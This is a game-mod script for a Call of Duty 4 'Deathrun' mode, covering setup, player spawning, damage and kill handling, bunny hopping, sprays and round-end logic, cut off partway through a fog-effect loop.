///////////////////////////////////////////////////////////////
////|         |///|        |///|       |/\  \/////  ///|  |////
////|  |////  |///|  |//|  |///|  |/|  |//\  \///  ////|__|////
////|  |////  |///|  |//|  |///|  |/|  |///\  \/  /////////////
////|          |//|  |//|  |///|       |////\    //////|  |////
////|  |////|  |//|         |//|  |/|  |/////    \/////|  |////
////|  |////|  |//|  |///|  |//|  |/|  |////  /\  \////|  |////
////|  |////|  |//|  | //|  |//|  |/|  |///  ///\  \///|  |////
////|__________|//|__|///|__|//|__|/|__|//__/////\__\//|__|////
///////////////////////////////////////////////////////////////
/*
	BraXi's Death Run Mod
	
	Website: www.braxi.org
	E-mail: paulina1295@o2.pl

	[DO NOT COPY WITHOUT PERMISSION]
*/

#include maps\mp\_utility;
#include common_scripts\utility;
#include maps\mp\gametypes\_hud_util;

#include braxi\_common;
#include braxi\_dvar;

main()
{

	braxi\_dvar::setupDvars(); // all dvars are there
	precache();
	init_spawns();
	braxi\_cod4stuff::main(); // setup vanilla cod4 variables
	//thread braxi\_bots::addTestClients();

	game["DeathRunVersion"] = 12; //DO NOT MODIFY! PLUGINS MIGHT REQUIRE THIS VERSION OR HIGHER
	level.mapName = toLower( getDvar( "mapname" ) );
	level.jumpers = 0;
	level.activators = 0;
	level.activatorKilled = false;
	level.freeRun = false;
	level.allowSpawn = true;
	level.tempEntity = spawn( "script_model", (0,0,0) ); // entity used to link players
	level.colliders = [];
	level.trapsDisabled = false;
	//level.admins = strTok( level.dvar["admins"], ";" );
	level.canCallFreeRun = true;
	level.color_cool_green = ( 0.8, 2.0, 0.8 );
	level.color_cool_green_glow = ( 0.3, 0.6, 0.3 );
	level.hudYOffset = 10;
	level.firstBlood = false;
	level.lastJumper = false;
	level.mapHasTimeTrigger = false;

	if( !isDefined( game["roundsplayed"] ) )
		game["roundsplayed"] = 1;
	game["roundStarted"] = false;
	game["state"] = "readyup";

	if( game["roundsplayed"] == 1 )
	{
		game["playedmaps"] = strTok( level.dvar["playedmaps"], ";" );
		addMap = true;
		if( game["playedmaps"].size )
		{
			for( i = 0; i < game["playedmaps"].size; i++ )
			{
				if( game["playedmaps"][i] == level.mapName )
				{
					addMap = false;
					break;
				}
			}
		}
		if( addMap )
		{
			appendToDvar( "dr_playedmaps", level.mapName+";" );
			level.dvar["playedmaps"] = getDvar( "dr_playedmaps" );
			game["playedmaps"] = strTok( level.dvar["playedmaps"], ";" ); //update
		}

		if( level.dvar["freerun"] )
			level.freeRun = true;
	}

	setDvar( "jump_slowdownEnable", 0 );
	setDvar( "bullet_penetrationEnabled", 0 );
	setDvar( "g_playerCollisionEjectSpeed", 1 );
	setDvar( "mod_author", "BraXi" );
	makeDvarServerInfo( "mod_author", "BraXi" );

	buildSprayInfo();
	buildCharacterInfo();
	buildItemInfo();
	buildAbilityInfo();
	bestMapScores();

	thread maps\mp\gametypes\_hud::init();
	thread maps\mp\gametypes\_hud_message::init();
	thread maps\mp\gametypes\_damagefeedback::init();
	thread maps\mp\gametypes\_clientids::init();
	thread maps\mp\gametypes\_gameobjects::init();
	thread maps\mp\gametypes\_spawnlogic::init();
	thread maps\mp\gametypes\_oldschool::deletePickups();
	thread maps\mp\gametypes\_hud::init();
	thread maps\mp\gametypes\_quickmessages::init();

	thread braxi\_admin::main();
	thread braxi\_menus::init();
	thread braxi\_scoreboard::init();
	thread braxi\_rank::init();
	thread braxi\_mapvoting::init();
	thread braxi\_playercard::init();
	braxi\_maps::init();
	//thread braxi\_credits::neon();
	thread braxi\_missions::init();
	thread final();
	thread viplist();
	thread pickuplist();
	thread xp();
    thread ted_gun();
    thread ammo();
	thread givesniper();
	thread switch_player();
	thread giveak74u();
	thread spec_player();
	thread glitch_player();
	thread givelives();
	thread wtf_gun();
    thread no_fullbright_player();
	thread show_player();
	thread hide_player();
	thread pick_dog();
	thread disco_cmd();
	thread dog_player();
	thread telegun();
	thread jetpack_up();
	thread invisible();
	thread giverpg();
	thread givetomahawk();
	thread giveminigun();
	thread allow_pickup();
	/*thread printCredits();*/
	thread envy();
	thread addTestClients();
	/*thread players();*/	
	
	level thread gameLogic();
	level thread doHud();
	level thread serverMessages();

	level thread firstBlood();
	level thread fastestTime();
	


	visionSetNaked( level.mapName, 0 );

	if( level.dvar["usePlugins"] )
	{
		println( "Initializing plugins..." );
		thread plugins\_plugins::main();
		println( "Plugins initialized" );
	}
}

precache()
{
	level.text = [];
	level.fx = [];

	precacheModel( "german_sheperd_dog" );
	precacheModel( "viewmodel_hands_zombie" );
	precacheModel( "tag_origin" );
	//precacheModel( "com_teddy_bear" );
	precacheModel( "body_mp_usmc_cqb" );
	precacheModel( "body_alice" );
	//precacheModel( "body_mp_sas_urban_sniper" );
	precacheModel( "mil_frame_charge" /*"aftermath_power_stationthing3"*/ );
	PreCacheModel("weapon_m67_grenade");
	precacheModel( "playermodel_baa_joker" );
	precacheModel( "playermodel_dnf_duke" );
	precacheModel( "playermodel_aot_novak_00_heavy" );
	precacheModel( "playermodel_aot_rosco_00_heavy" );
	
	precacheItem( "colt45_mp" );
	precacheItem( "tomahawk_mp" );
	precacheItem( "claymore_mp" );
	precacheItem( "knife_mp" );
	precacheItem( "dog_mp" );
	precacheitem("m1014_grip_mp");
	precacheitem("frag_grenade_mp");
	precacheitem("winchester1200_grip_mp");
	precacheitem("c4_mp");
	precacheitem("radar_mp");
	precacheitem("m60e4_mp");
	precacheitem("ak74u_mp");
	precacheitem("brick_blaster_mp");
	precacheitem("m40a3_mp");
	precacheitem("usp_mp");
	precacheitem("winchester1200_mp");
	precacheitem("g36c_reflex_mp");
	precacheitem("tom_axe_mp");
	precacheitem("tom_katana_mp");
	precacheitem("barrett_acog_mp");
	
	precacheMenu( "clientcmd" );
	precacheMenu( "musicmenu" );
	precacheMenu( "musicmenu1" );
	
	precacheShader( "black" );
	precacheShader( "white" );
	precacheShader( "killiconsuicide" );
	precacheShader( "killiconmelee" );
	precacheShader( "killiconheadshot" );
	precacheShader( "killiconfalling" );
	precacheShader( "stance_stand" );
	precacheShader( "hudstopwatch" );
	precacheShader( "score_icon" );
	precacheShader("dtimer_1");
	precacheShader("rank_gen1");
	
	PrecacheShellShock("frag_grenade_mp");

	precacheStatusIcon( "hud_status_connecting" );
	precacheStatusIcon( "hud_status_dead" );
	precacheHeadIcon( "headicon_admin" );
	
	level.text["round_begins_in"] = &"BRAXI_ROUND_BEGINS_IN";
	level.text["waiting_for_players"] = &"BRAXI_WAITING_FOR_PLAYERS";
	//level.text["spectators_count"] = &"BRAXI_SPECTATING1";
	level.text["jumpers_count"] = &"BRAXI_ALIVE_JUMPERS";
	level.text["call_freeround"] = &"BRAXI_CALL_FREEROUND";

	precacheString( level.text["round_begins_in"] );
	precacheString( level.text["waiting_for_players"] );
	//precacheString( level.text["spectators_count"] );
	precacheString( level.text["jumpers_count"] );
	precacheString( level.text["call_freeround"] );
	precacheString( &"Your Time: ^5&&1" );
	precacheString( &"Time Left: " );

	level.fx["falling_teddys"] = loadFx( "deathrun/falling_teddys" );
	level.fx["gib_splat"] = loadFx( "deathrun/gib_splat" );
	level.fx["light_blink"] = loadFx( "misc/light_c4_blink" );
	level.explodefx = loadfx( "explosions/aerial_explosion" );
	level._effect["iPRO"] = loadfx("explosions/grenadeExp_water");
	level.chopper_fx["explode"]["medium"] = loadfx ("explosions/aerial_explosion");
}

init_spawns()
{
	level.spawn = [];
	level.spawn["allies"] = getEntArray( "mp_jumper_spawn", "classname" );
	level.spawn["axis"] = getEntArray( "mp_activator_spawn", "classname" );
	level.spawn["spectator"] = getEntArray( "mp_global_intermission", "classname" )[0];

	if( !level.spawn["allies"].size ) // try to use diferent spawn points if not found vaild mod spawns on map
		level.spawn["allies"] = getEntArray( "mp_dm_spawn", "classname" );
	if( !level.spawn["axis"].size )
		level.spawn["axis"] = getEntArray( "mp_tdm_spawn", "classname" );

	for( i = 0; i < level.spawn["allies"].size; i++ )
		level.spawn["allies"][i] placeSpawnPoint();

	for( i = 0; i < level.spawn["axis"].size; i++ )
		level.spawn["axis"][i] placeSpawnPoint();
}


buildSprayInfo()
{
	level.sprayInfo = [];
	level.numSprays = 0;
	
	tableName = "mp/sprayTable.csv";

	for( idx = 1; isdefined( tableLookup( tableName, 0, idx, 0 ) ) && tableLookup( tableName, 0, idx, 0 ) != ""; idx++ )
	{
		id = int( tableLookup( tableName, 0, idx, 1 ) );
		level.sprayInfo[id]["rank"] = (int(tableLookup( tableName, 0, idx, 2 )) - 1);
		level.sprayInfo[id]["shader"] = tableLookup( tableName, 0, idx, 3 );
		level.sprayInfo[id]["effect"] = loadFx( tableLookup( tableName, 0, idx, 4 ) );
		
		precacheShader( level.sprayInfo[id]["shader"] );
		level.numSprays++;
	}
}

buildAbilityInfo()
{
	level.abilityInfo = [];
	level.numAbilities = 0;
	
	tableName = "mp/abilityTable.csv";

	for( idx = 1; isdefined( tableLookup( tableName, 0, idx, 0 ) ) && tableLookup( tableName, 0, idx, 0 ) != ""; idx++ )
	{
		id = int( tableLookup( tableName, 0, idx, 1 ) );
		level.abilityInfo[id]["stat"] = int(tableLookup( tableName, 0, idx, 2 ));
		level.abilityInfo[id]["codeName"] = tableLookup( tableName, 0, idx, 3 );
		level.abilityInfo[id]["shader"] = tableLookup( tableName, 0, idx, 4 );
		level.abilityInfo[id]["name"] =  tableLookup( tableName, 0, idx, 5 );
		level.abilityInfo[id]["desc"] = loadFx( tableLookup( tableName, 0, idx, 6 ) );
		
		precacheShader( level.abilityInfo[id]["shader"] );
		level.numSprays++;
	}
}

buildCharacterInfo()
{
	level.characterInfo = [];
	level.numCharacters = 0;
	
	tableName = "mp/characterTable.csv";

	for( idx = 1; isdefined( tableLookup( tableName, 0, idx, 0 ) ) && tableLookup( tableName, 0, idx, 0 ) != ""; idx++ )
	{
		id = int( tableLookup( tableName, 0, idx, 1 ) );
		level.characterInfo[id]["rank"] = (int(tableLookup( tableName, 0, idx, 2 )) - 1);
		level.characterInfo[id]["shader"] = tableLookup( tableName, 0, idx, 3 );
		level.characterInfo[id]["model"] = tableLookup( tableName, 0, idx, 4 );
		level.characterInfo[id]["handsModel"] = tableLookup( tableName, 0, idx, 5 );
		level.characterInfo[id]["name"] = tableLookup( tableName, 0, idx, 6 );
		level.characterInfo[id]["desc"] = tableLookup( tableName, 0, idx, 7 );
		
		precacheShader( level.characterInfo[id]["shader"] );
		precacheModel( level.characterInfo[id]["model"] );
		precacheModel( level.characterInfo[id]["handsModel"] );
		level.numCharacters++;
	}
}

buildItemInfo()
{
	level.itemInfo = [];
	level.numItems = 0;
	
	tableName = "mp/itemTable.csv";

	for( idx = 1; isdefined( tableLookup( tableName, 0, idx, 0 ) ) && tableLookup( tableName, 0, idx, 0 ) != ""; idx++ )
	{
		id = int( tableLookup( tableName, 0, idx, 1 ) );
		level.itemInfo[id]["rank"] = (int(tableLookup( tableName, 0, idx, 2 )) - 1);
		level.itemInfo[id]["shader"] = tableLookup( tableName, 0, idx, 3 );
		level.itemInfo[id]["item"] = (tableLookup( tableName, 0, idx, 4 ) + "_mp");
		level.itemInfo[id]["name"] = tableLookup( tableName, 0, idx, 5 );
		level.itemInfo[id]["desc"] = tableLookup( tableName, 0, idx, 6 );
		
		precacheShader( level.itemInfo[id]["shader"] );
		precacheItem( level.itemInfo[id]["item"] );
		//precacheString( level.itemInfo[id]["name"] );
		//precacheString( level.itemInfo[id].desc );
		level.numItems++;
	}
}

playerConnect() // Called when player is connecting to server
{
	level notify( "connected", self );
	
//	self thread MusicMenu();
	self thread cleanUp();
	self.guid = self getGuid();
	self.number = self getEntityNumber();
	self.statusicon = "hud_status_connecting";
	self.died = false;
	self.doingNotify = false; //for hud logic

	if( !isDefined( self.name ) )
		self.name = "undefined name";
	if( !isDefined( self.guid ) )
		self.guid = "undefined guid";

	//self thread doHud();
	self thread updateHealthBar();

	// we want to show hud and we get an IP adress for "add to favourities" menu
	self setClientDvars( "show_hud", "true", "ip", getDvar("net_ip"), "port", getDvar("net_port") );
	if( !isDefined( self.pers["team"] ) )
	{
		if( level.dvar["show_guids"] )
			iPrintln( self.name + " ^2[" + getSubStr( self.guid, 24, 32 ) + "^2] ^7entered the game" );
		else
			iPrintln( self.name + " ,^7Welcome to ^1[^3oP^1] ^7Deathrun server!" );

		self.sessionstate = "spectator";
		self.team = "spectator";
		self.pers["team"] = "spectator";

		self.pers["score"] = 0;
		self.pers["kills"] = 0;
		self.pers["deaths"] = 0;
		self.pers["assists"] = 0;
		self.pers["lifes"] = 0;
        self.pers["money"] = 0;
		self.pers["headshots"] = 0;
		self.pers["knifes"] = 0;
		self.pers["activator"] = 0;
		self.pers["time"] = 99999999;
		self.pers["isDog"] = false;
		self.pers["randomer"] = false;
		self.pers["isJoker"] = false;
		self.pers["isDuke"] = false;
		self.pers["isArmy"] = false;
		self.pers["ability"] = "specialty_null";
	}
	else
	{
		self.score = self.pers["score"];
		self.kills = self.pers["kills"];
		self.assists = self.pers["assists"];
		self.deaths = self.pers["deaths"];
	}

	
//	self thread KDHud();
	
	self thread SetupLives();
	
	self thread modBanned();

	if( game["state"] == "endmap" )
	{
		self spawnSpectator( level.spawn["spectator"].origin, level.spawn["spectator"].angles );
		self.sessionstate = "intermission";
		return;
	}

	if( isDefined( self.pers["weapon"] ) && self.pers["team"] != "spectator" )
	{
		self.pers["weapon"] = "colt_mp";
		self thread braxi\_teams::setTeam( "allies" ); //just keep in case... i saw player in new round that shouldnt be opfor but was (v0.3)
		spawnPlayer();
		return;
	}
	else
	{
		self spawnSpectator( level.spawn["spectator"].origin, level.spawn["spectator"].angles );
		self thread delayedMenu();
		//bxLogPrint( ("J: " + self.name + " ; guid: " + self.guid) );
		logPrint("J;" + self.guid + ";" + self.number + ";" + self.name + "\n");
	}

	self setClientDvars( "cg_drawSpectatorMessages", 1, "ui_hud_hardcore", 1, "player_sprintTime", 4, "ui_uav_client", 0, "g_scriptMainMenu", game["menu_team"] );
}


playerDisconnect() // Called when player disconnect from server
{
	level notify( "disconnected", self );
	self thread cleanUp();
	self thread destroyLifeIcons();

	if( !isDefined( self.name ) )
		self.name = "no name";

	if( level.dvar["show_guids"] )
		iPrintln( self.name + " ^2[" + getSubStr( self getGuid(), 24, 32 ) + "^2] ^7left the game" );
	else
		iPrintln( self.name + " ^7left the game" );

	logPrint("Q;" + self getGuid() + ";" + self getEntityNumber() + ";" + self.name + "\n");
}


PlayerLastStand( eInflictor, attacker, iDamage, sMeansOfDeath, sWeapon, vDir, sHitLoc, psOffsetTime, deathAnimDuration )
{
	self suicide();
}

PlayerDamage(eInflictor, eAttacker, iDamage, iDFlags, sMeansOfDeath, sWeapon, vPoint, vDir, sHitLoc, psOffsetTime)
{
	if( self.sessionteam == "spectator" || game["state"] == "endmap" )
		return;

	level notify( "player_damage", self, eAttacker, iDamage, iDFlags, sMeansOfDeath, sWeapon, vPoint, vDir, sHitLoc, psOffsetTime );

	if( isPlayer( eAttacker ) && eAttacker.pers["team"] == self.pers["team"] )
		return;

	if( isPlayer( eAttacker ) && sMeansOfDeath == "MOD_MELEE" && isWallKnifing( eAttacker, self ) )
	{
		//cmd = spawnStruct();
		//cmd[0] = "warn";
		//cmd[1] = attacker getEntityNumber();
		//cmd[2] = "trying to knife through wall";
		//level thread braxi\_admin::adminCommands( cmd, "number" );
		return;
	}

	// damage modifier
	if( sMeansOfDeath != "MOD_MELEE" )
	{
		if( isPlayer( eAttacker ) && eAttacker.pers["ability"] == "specialty_bulletdamage" )
			iDamage = int( iDamage * 1.1 );

		modifier = getDvarFloat( "dr_damageMod_" + sWeapon );
		if( modifier <= 2.0 && modifier >= 0.1 && sMeansOfDeath != "MOD_MELEE" )
			iDamage = int( iDamage * modifier );
	}

	if( level.dvar["damage_messages"] && isPlayer( eAttacker ) && eAttacker != self )
	{	
		eAttacker iPrintln( "You hit " + self.name + " ^7for ^2" + iDamage + " ^7damage." );
		self iPrintln( eAttacker.name + " ^7hit you for ^2" + iDamage + " ^7damage." );
	}

	if(!isDefined(vDir))
		iDFlags |= level.iDFLAGS_NO_KNOCKBACK;

	if(!(iDFlags & level.iDFLAGS_NO_PROTECTION))
	{
		if(iDamage < 1)
			iDamage = 1;

		self finishPlayerDamage(eInflictor, eAttacker, iDamage, iDFlags, sMeansOfDeath, sWeapon, vPoint, vDir, sHitLoc, psOffsetTime );
	}
}

PlayerKilled(eInflictor, attacker, iDamage, sMeansOfDeath, sWeapon, vDir, sHitLoc, psOffsetTime, deathAnimDuration )
{
	self endon("spawned");
	self notify("killed_player");
	self notify("death");

	if(self.sessionteam == "spectator" || game["state"] == "endmap" )
		return;

	level notify( "player_killed", self, eInflictor, attacker, iDamage, sMeansOfDeath, sWeapon, vDir, sHitLoc, psOffsetTime, deathAnimDuration );

	if( level.dvar[ "giveXpForKill" ] && !level.trapsDisabled )		
	{
		if( isDefined( level.activ ) && level.activ != self && level.activ isReallyAlive() )	
			if( sMeansOfDeath == "MOD_UNKNOWN" || sMeansOfDeath == "MOD_FALLING" || sMeansOfDeath == "MOD_SUICIDE" )
				level.activ braxi\_rank::giveRankXP( "jumper_died" );
	}

	if(sHitLoc == "head" && sMeansOfDeath != "MOD_MELEE")
	{
		sMeansOfDeath = "MOD_HEAD_SHOT";
	}

	body = self clonePlayer( deathAnimDuration );
	body.targetname = "dr_deadbody";

	if( level.dvar["gibs"] && iDamage >= self.maxhealth && sMeansOfDeath != "MOD_MELEE" && sMeansOfDeath != "MOD_RIFLE_BULLET" && sMeansOfDeath != "MOD_PISTOL_BULLET" && sMeansOfDeath != "MOD_SUICIDE" && sMeansOfDeath != "MOD_HEAD_SHOT" )
		body gib_splat();

	if( isDefined( body ) )
	{
		if ( self isOnLadder() || self isMantling() )
			body startRagDoll();
		thread delayStartRagdoll( body, sHitLoc, vDir, sWeapon, eInflictor, sMeansOfDeath );
	}

	//self.sessionstate = "dead";
	self.statusicon = "hud_status_dead";
	self.sessionstate =  "spectator";

	if( isPlayer( attacker ) )
	{
		if( attacker != self )
		{
			braxi\_rank::processXpReward( sMeansOfDeath, attacker, self );

			attacker.kills++;
			attacker.pers["kills"]++;

			if( self.pers["team"] == "axis" )
			{
				attacker giveLife();
			}
		}
	}

	if( !level.freeRun )
	{
		deaths = self maps\mp\gametypes\_persistence::statGet( "deaths" );
		self maps\mp\gametypes\_persistence::statSet( "deaths", deaths+1 );
		self.deaths++;
		self.pers["deaths"]++;
	}
	self.died = true;

	self thread cleanUp();

	obituary( self, attacker, sWeapon, sMeansOfDeath );

	if( self.pers["team"] == "axis" )
	{
		if( isPlayer( attacker ) && attacker.pers["team"] == "allies" )
		{
			text = ( attacker.name + " ^7killed Activator" );
			thread drawInformation( 800, 0.8, 1, text );
			thread drawInformation( 800, 0.8, -1, text );
		}

		level.activatorKilled = true;
		self thread braxi\_teams::setTeam( "allies" );
	}

	if( self.pers["team"] != "axis" )
	{
		self thread respawn();
	}

}

spawnPlayer( origin, angles )
{
//	self endon( "disconnect" );
	if( game["state"] == "endmap" ) 
		return;

	level notify( "jumper", self );
	self thread cleanUp();
	resettimeout();

	self.team = self.pers["team"];
	self.sessionteam = self.team;
	self.sessionstate = "playing";
	self.spectatorclient = -1;
	self.killcamentity = -1;
	self.archivetime = 0;
	self.psoffsettime = 0;
	self.statusicon = "";
	
	self braxi\_teams::setPlayerModel();
	//self setModel( "body_alice" );

	if( isDefined( origin ) && isDefined( angles ) )
		self spawn( origin,angles );
	else
	{
		spawnPoint = level.spawn[self.pers["team"]][randomInt(level.spawn[self.pers["team"]].size)];
		self spawn(  spawnPoint.origin, spawnPoint.angles );
	}

	self SetActionSlot( 1, "nightvision" );
	if( self.pers["team"] == "allies" )
	{
		if( self.model == "german_sheperd_dog" )
			self.pers["weapon"] = "dog_mp";
		else
			self.pers["weapon"] = level.itemInfo[self getStat(981)]["item"];

		/*if( self.pers["weapon"] == "usp_mp" )
			self setClientDvar( "cg_laserForceOn", 1 );
		else
			self setClientDvar( "cg_laserForceOn", 0 );*/

	}
	if( level.trapsDisabled || self.pers["team"] == "axis" )
	{
		self.pers["weapon"] = "tomahawk_mp";
	}

	self giveWeapon( self.pers["weapon"] );
	self setSpawnWeapon( self.pers["weapon"] );
	self giveMaxAmmo( self.pers["weapon"] );
	self setViewModel( "viewmodel_hands_zombie" );

	self thread braxi\_teams::setHealth();
	self thread braxi\_teams::setSpeed();
	self thread afterFirstFrame();

	if( self braxi\_admin::hasPermission( "b" ) )
		self.headicon = "headicon_admin";

	self notify( "spawned_player" );
	level notify( "player_spawn", self );

	//self thread test();
}

test()
{
	/*while( !self meleeButtonPressed() )
		wait 0.05;

	body = self clonePlayer( 999999999999 );
	body hide();
	body showToPlayer( self );

	thread preview( body );
	wait 1;


	body setModel( level.characterInfo[0].model );

	maxnum = level.characterInfo.size;*/
	while( 1 )
	{
		while( !self useButtonPressed() )
			wait 0.05;
		//while( self meleeButtonPressed() )
		//	wait 0.05;


		wait 0.1;
		self thread makemenotsolid();
		contents = self setContents( 0 );
		//iprintln( "old contents: " + contents );
		//contents = self setContents( 4 );
		//iprintln( "new contents: " + contents );


		//self braxi\_rank::giveRankXP( "kill", 5000 );
		break;
		/*num++;
		body setModel( level.characterInfo[num].model );

		if( num >= maxnum )
			num = 0;*/
	}

}

makeMeNotSolid()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

	self setClientDvar( "g_playerCollisionEjectSpeed", 1 );
	while( self isReallyAlive() )
	{
		wait 0.05;
		self setContents( 0 );
	}
}


/*
preview( body )
{
	body.origin = self.origin + (0,0,24);
	while( isDefined( body ) )
	{
		body rotateYaw( 360, 4 );
		wait 4;
	}
}
*/
afterFirstFrame()
{
	self endon( "disconnect" );
    self endon( "joined_spectators" );
    self endon( "death" );
	waittillframeend;
	wait 0.1;

	if( !self isPlaying() )
		return;

	if( game["state"] == "readyup" )
	{
		self linkTo( level.tempEntity );
		self disableWeapons();
	}
	else
	{
		self thread antiAFK();
	}
	if( self.pers["team"] == "allies" )
	{
	}
	else
	{
		self thread freeRunChoice();
	}
	
	if( self getStat( 988 ) == 1 )
		self setClientDvar( "cg_thirdperson", 0 );


	// give special ability
	self clearPerks();
	self.pers["ability"] = level.abilityInfo[self getStat(982)]["codeName"];
	if( self.pers["ability"] != "specialty_null" && self.pers["ability"] != "" )
	{
		self setPerk( self.pers["ability"] );
		self thread showAbility();

		if( self.pers["ability"] == "specialty_armorvest"  )
		{
			self.maxhealth = self.health + int( self.health/10 );
			self.health = self.maxhealth;
		}
	}


	//self thread makeMeNotSolid();
	self thread watchItems();
	self thread playerTimer();
	self thread sprayLogo();
	self thread bunnyHoop();
	self thread watchDog();
	self thread watchJoker();
	self thread watchDuke();
	self thread watchArmyh();
	self thread watchRoskoh();
	self thread watchrandomer();
	//self thread advancedJumping();
	//Music
}

bunnyHoop()
{
    self endon( "disconnect" );
    self endon( "spawned_player" );
    self endon( "joined_spectators" );
    self endon( "death" );

    if( !level.dvar["bunnyhoop"] )
        return;

    while( game["state"] != "playing" )
		wait 0.05;
    
	// mnaauuu
    last = self.origin; 
    lastBH = 0;
    lastCount = 0;
    // ----- //

    while( isAlive( self ) )
    {        
		// mnaauuu
		dist = distance(self.origin, last);
        last = self.origin; 
        if ( dist > 450 && lastBH && lastCount > 5) 
		{
            num = self getEntityNumber();
            guid = self getGuid();
            logPrint( "LJ;" + guid + ";" + num + ";" + self.name + ";\n" );
            self iprintln("^3Lagjump? ^1DIE!");
        }    
        lastBH = self.doingBH;        
        wait 0.1;
        self setClientDvar( "com_maxfps", 125 ); //  what is this for?
		// ----- //

        stance = self getStance();
        useButton = self useButtonPressed();
        onGround = self isOnGround();
        fraction = bulletTrace( self getEye(), self getEye() + vector_scale(anglesToForward(self.angles), 32 ), true, self )["fraction"];
        
        // Begin
        if( !self.doingBH && useButton && !onGround && fraction == 1 )
        {
            self setClientDvars( "bg_viewKickMax", 0, "bg_viewKickMin", 0, "bg_viewKickRandom", 0, "bg_viewKickScale", 0 );
            self.doingBH = true;
            lastCount = 0;
        }

        // Accelerate
        if( self.doingBH && useButton && onGround && stance != "prone" && fraction == 1 )
        {
            lastCount++;
            if( self.bh < 120 )
                self.bh += 30;
        }

        // Finish
        if( self.doingBH && !useButton || self.doingBH && stance == "prone" || self.doingBH && fraction < 1 )
        {
            self setClientDvars( "bg_viewKickMax", 90, "bg_viewKickMin", 5, "bg_viewKickRandom", 0.4, "bg_viewKickScale", 0.2 );
            self.doingBH = false;
            self.bh = 0;
            lastCount = 0;
            continue;
        }

        // Bounce
        if( self.bh && self.doingBH && onGround && fraction == 1 )
        {
            bounceFrom = (self.origin - vector_scale( anglesToForward( self.angles ), 50 )) - (0,0,42);
            bounceFrom = vectorNormalize( self.origin - bounceFrom );
            self bounce( bounceFrom, self.bh );
            self bounce( bounceFrom, self.bh );
            wait 0.1;
        }
    }
}


advancedJumping()
{
	// NOTE! This code is extremly EXPERIMENTAL AND GLITCHY
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );
	self endon( "death" );

	if( !isDefined( self.bh ) )
		self.bh = 0;

	wait 1;

	while( self isReallyAlive() )
	{
		while( self isOnGround() || self.bh ) // don't do that if we're not on the ground or we're bunny hooping
			wait 0.1;

		while( self.sessionstate == "playing" && !self isOnGround() && !self.bh )
		{	
			// @BUG: looks like player can jump forward abit longer
			//iprintln( "advanced jump: " + num );
			vec = ( self.origin + (0,0,-1) + vector_scale( anglesToForward( self.angles ), 9 ) );
			endPos = playerPhysicsTrace( self.origin, vec );
			self setOrigin( (endPos[0], endPos[1], self.origin[2] ) );
			wait 0.05;
		}
		wait 0.1; // delay before another advanced jump
	}
}

isAngleOk( angles, min, max )
{
	diff = distance( angles, self.angles );
	iprintln( "diff:" + diff );
	if( diff >= min && diff <= max )
		return true;
	return false;
}

sprayLogo()
{
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );
	self endon( "death" );

	if( !level.dvar["sprays"] )
		return;

	while( game["state"] != "playing" )
		wait 0.05;

	while( self isReallyAlive() )
	{
		while( !self fragButtonPressed() )
			wait .2;

		if( !self isOnGround() )
		{
			wait 0.2;
			continue;
		}

		angles = self getPlayerAngles();
		eye = self getTagOrigin( "j_head" );
		forward = eye + vector_scale( anglesToForward( angles ), 70 );
		trace = bulletTrace( eye, forward, false, self );
		
		if( trace["fraction"] == 1 ) //we didnt hit the wall or floor
		{
			wait 0.1;
			continue;
		}

		position = trace["position"] - vector_scale( anglesToForward( angles ), -2 );
		angles = vectorToAngles( eye - position );
		forward = anglesToForward( angles );
		up = anglesToUp( angles );

		sprayNum = self getStat( 979 );


		if( isDefined( self.pers["customSpray"] ) )
			sprayNum = 25;

		if( sprayNum < 0 )	
			sprayNum = 0;
		else if( sprayNum > level.numSprays )
			sprayNum = level.numSprays;

		playFx( level.sprayInfo[sprayNum]["effect"], position, forward, up );
		self playSound( "sprayer" );

		self notify( "spray", sprayNum, position, forward, up ); // ch_sprayit

		wait level.dvar["sprays_delay"];
	}
}

endRound( reasonText, team )
{
	level endon ( "endmap" );

	if( game["state"] == "round ended" || !game["roundStarted"] )
		return;

	level notify( "round_ended", reasonText, team );
	level notify( "endround" );
	level notify( "kill logic" );

	game["state"] = "round ended";
	game["roundsplayed"]++;

	if( isDefined( level.hud_time ) )
		level.hud_time destroy();

	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
	{
		players[i] setClientDvars( "cg_thirdperson", 0, "r_blur", 0.0, "show_hud", "false" );
	}
	//thread partymode();

	if( team == "jumpers" )
	{
		visionSetNaked( "jumpers", 4 );
	}
	else
	{
		visionSetNaked( "activators", 4 );
		
		if( isDefined( level.activ ) && isPlayer( level.activ ) ) 
			level.activ braxi\_rank::giveRankXp( "activator" );
	}

	if( game["roundsplayed"] >= (level.dvar[ "round_limit" ]+1) )
	{
		level endMap( "Game has ended" );
		return;
	}
	else
	{
		level thread endRoundAnnoucement( reasonText, (0,1,0) );
		if( level.dvar["roundSound"] )
		{
			ambientStop(0);
			self musicstop();
			song = (1+randomInt(10));
			level thread playSoundOnAllPlayers( "end_round_" + song );
			level.nphud setText( "^3Now playing: ^7" + getDvar( "dr_song_" + song ) );
		}
	}

	wait 10;
	
	level.nphud destroy();
	map_restart( true );
}

nphud()
{
	level.nphud = newHudElem();
    level.nphud.foreground = true;
	level.nphud.alignX = "left";
	level.nphud.alignY = "top";
	level.nphud.horzAlign = "left";
    level.nphud.vertAlign = "top";
    level.nphud.x = 5;
    level.nphud.y = -6 + level.hudYOffset;
    level.nphud.sort = 0;
  	level.nphud.fontScale = 1.4;
	level.nphud.color = (1, 1.0, 1);
	level.nphud.font = "objective";
	level.nphud.glowColor = level.randomcolour;
	level.nphud.glowAlpha = 1;
 	level.nphud.hidewheninmenu = false;
}

partymode()
{
	for(;;)
	{	
		SetExpFog(256, 900, 1, 0, 0, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0, 1, 0, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 0, 1, 0.1); 
		wait .5; 
        SetExpFog(256, 900, 0.4, 1, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.8, 0, 0.6, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 1, 0.6, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 1, 1, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 0, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.2, 1, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.4, 0.4, 1, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 0, 0, 0.1); 
         wait .5; 
